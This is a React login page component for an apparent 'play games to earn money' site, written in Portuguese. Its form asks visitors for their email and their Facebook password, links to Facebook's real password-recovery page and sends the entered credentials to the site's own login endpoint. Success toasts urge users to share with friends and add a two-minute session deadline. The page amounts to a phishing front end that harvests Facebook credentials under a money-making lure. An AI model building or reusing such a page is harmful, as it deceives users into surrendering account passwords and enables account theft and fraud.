import axios from 'axios';
import { useForm } from 'react-hook-form';
import { useNavigate, useParams } from 'react-router';
import { Link } from 'react-router-dom';
import "./Login.css"
import { toast } from 'react-toastify';

const Login = () => {

  let data = useForm();
  let navigate = useNavigate();


  const loginKaro = (udata) => {

    // console.log(udata);
    // axios.post("http://localhost:8060/login", udata)
    //   .then(res => {
    //     alert(res.data.message)
    //     navigate("/Home")
    //   })

    fetch("/login", {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(udata)
    })
      .then(res => res.json()).then(
        data => {
          console.log(data);
          if (data.message === "Login Successfull") {
            alert(data.message);
            navigate("/Home")
            toast("Obrigado por se juntar a nós")
            toast("bem-vindo para ganhar dinheiro")
            toast("jogue conosco")
            toast("Compartilhe com os seus amigos")
            toast("jogue os jogos para ganhar dinheiro")
            toast("A sessão expirará em 2 minutos")
          } else {
            toast(data.message)
            alert(data.message);
            toast("Insira suas informações corretas")
          }
        }
      )

  }


  return (
    <>
      <div className='containerrr'>
        <form onSubmit={data.handleSubmit(loginKaro)} className="signup" >
          <h1>Entre para ganhar dinheiro</h1>
          <h2 className='head'>
            não tem conta <Link to={"/"}>
              inscrever-se</Link>
          </h2>

          <div className="signup__field">
            <input
              {...data.register("email", { required: true })}
              className="signup__input"
              type="email"
              name="email"
              id="email"
              required=""
            />

            <label className="signup__label" htmlFor="email">
              Digite seu e-mail
            </label>
            {data.formState.errors.email && <div className="error" style={{ color: "red" }}>por favor digite seu e-mail válido</div>}
          </div>
          <div className="signup__field">
            <input
              {...data.register('password', {
                required: true, minLength: 6,

              })}
              className="signup__input"
              type="password"
              name="password"
              id="password"
              required=""
            />

            <label className="signup__label" htmlFor="password">
              Digite sua senha do Facebook
            </label>
            {data.formState.errors.password && data.formState.errors.password.type == "required" && <div className="error" style={{ color: "red" }}>Por favor, digite sua senha para continuar.</div>}
            {data.formState.errors.password && data.formState.errors.password.type == "minLength" && <div className="error" style={{ color: "red" }}>por favor digite sua senha correta do facebook</div>}

          </div>
          <div className="signup__field" style={{ marginTop: "-30px" }}>
            <span><Link to={"https://web.facebook.com/login/identify/?ctx=recover&from_login_screen=0"}>Esqueceu sua senha?</Link></span>
          </div>
          <button className='button'>Login</button>
        </form>

      </div>
    </>
  )
}

export default Login
